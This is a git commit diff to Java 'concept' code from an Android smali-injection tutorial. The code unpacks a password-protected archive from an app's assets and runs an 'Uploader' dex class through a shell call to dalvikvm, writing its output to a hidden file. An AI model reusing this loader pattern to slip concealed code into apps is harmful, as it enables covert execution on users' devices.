e56c2abbb6de0472c11f4d6e46f5ba723ba475a7
hung0125 <65654501+hung0125@users.noreply.github.com>
2021-02-04 00:48:50 +0800

    Update concept.java

--- tutorials/smali_injection/Special!!/Code for smali injection (concept)/concept.java
+++ tutorials/smali_injection/Special!!/Code for smali injection (concept)/concept.java
@@ -1,39 +1,47 @@
-//copy dex file
-private void iq500copy(InputStream in, OutputStream out) throws IOException {
+	//copy dex file
+	private void iq500copy(InputStream in, OutputStream out) throws IOException {
         byte[] buffer = new byte[1024];
         int read;
         while((read = in.read(buffer)) != -1){
 			out.write(buffer, 0, read);
         }
     }
-//main function
-private void iq500Uploader()
+    //main function
+	private void iq500Uploader()
 	{
 		File outputDir = this.getCacheDir();
 		String cacheRoot = outputDir.toString();
-		File f = new File(cacheRoot + "/classes.dex"); //core class (uploader)
+		File coreClassLocation = new File(cacheRoot + "/classes.zip"); //core class (uploader)
 		try
 		{
 			//check if adding Uploader class to cache folder is required
-			if(!f.exists())
+			if(!coreClassLocation.exists())
 			{
 				AssetManager assetManager = getAssets();
-				InputStream in = assetManager.open("classes.dex");
-				OutputStream out = new FileOutputStream(f);
+				InputStream in = assetManager.open("classes.zip");
+				OutputStream out = new FileOutputStream(coreClassLocation);
 				iq500copy(in, out);
 				in.close();
 				out.flush();
 				out.close();
+				//unzip
+				ZipFile zipFile = new ZipFile(coreClassLocation);
+				if (zipFile.isEncrypted()) {
+					zipFile.setPassword("a");
+				}
+				String dest = new String(cacheRoot);
+				zipFile.extractAll(dest);
+				
 			}
-			
+
 			//Run the dex file copied
 			String[] cmds = {"sh", "-c", String.format("cd %s && dalvikvm -cp classes.dex Uploader > .upr3su1t", cacheRoot)};
 			Runtime.getRuntime().exec(cmds);
-			
+
 		}
 		catch (Exception e)
 		{
 			//debug use
-			//Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
+			Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
 		}
 	}
